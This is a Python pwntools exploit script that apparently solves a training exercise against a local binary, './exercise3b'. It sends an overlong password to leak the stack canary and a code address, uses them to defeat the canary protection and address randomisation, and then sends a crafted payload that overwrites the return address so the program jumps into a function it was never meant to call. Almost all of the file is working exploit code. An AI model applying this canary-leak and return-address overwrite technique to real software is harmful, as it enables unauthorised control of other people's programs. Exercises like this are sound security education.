#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *(check_authorization+83)
b *(check_authorization+91)
b *(check_authorization+144)
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
hello = 0x0000000000001288
uncallable = 0x0000000000001269
canary_leak = 'A'*111

r = start()
r.recvuntil(b'password:\n')
r.sendline(canary_leak)
leak = r.recvuntil(b' is not the password\n')
print(leak)
canary_address = leak[127: len(leak) - 21]
canary = canary_address[:4]
leaked_address = canary_address[4:]
print(canary_address)
print(len(canary_address))
print(canary)
print(len(canary))
print(leaked_address)
print(len(leaked_address))
print(leaked_address.hex())

offset = int.from_bytes(leaked_address, byteorder='little') - hello
leaked_address = int.from_bytes(leaked_address, byteorder='little')
uncallable_offset = uncallable + offset


shellcode = b'A'*112 + canary + p64(leaked_address) + b'B'*28 + p64(uncallable_offset) + p64(0x00000000)
r.recvuntil(b'password:\n')
r.sendline(shellcode)
print(r.recvall().decode(errors='ignore'))

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

